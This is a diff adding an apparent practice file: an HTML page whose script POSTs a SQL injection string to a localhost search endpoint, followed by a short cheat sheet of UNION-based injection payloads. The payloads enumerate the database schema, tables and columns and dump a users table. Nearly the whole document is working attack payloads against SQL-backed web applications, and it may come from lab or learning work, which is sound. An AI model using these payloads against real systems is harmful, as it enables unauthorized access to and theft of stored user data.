@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<script>
+    url = "http://localhost:3000/search";         
+    var email2 = { email2: "dev' or '1' = '1" };                      
+
+    fetch(url, {     
+    	method : 'POST',     
+    	body : JSON.stringify(email2),
+    	headers: {
+            'Content-Type': 'application/json',
+        } } )
+    .then((response) => {console.log(response);})
+    .catch(error =>  {console.log(error);});
+
+
+</script>
+</body>
+</html>
+
+get schema
+' union SELECT distinct table_name,table_schema FROM information_schema.columns WHERE '1'='1 
+
+get all tables
+' union SELECT distinct table_name,column_name FROM information_schema.columns WHERE '1'='1
+
+get specific table
+' union SELECT table_name,column_name FROM information_schema.columns WHERE table_name = 'users'
+
+get all columns in a table //find count of columns outputed bby server first
+' union SELECT distinct table_name,column_name FROM information_schema.columns WHERE TABLE_NAME = 'users'
+
+get values foor a particular column
+' UNION SELECT * FROM sqlmap.users where email='de' or '1' = '1'
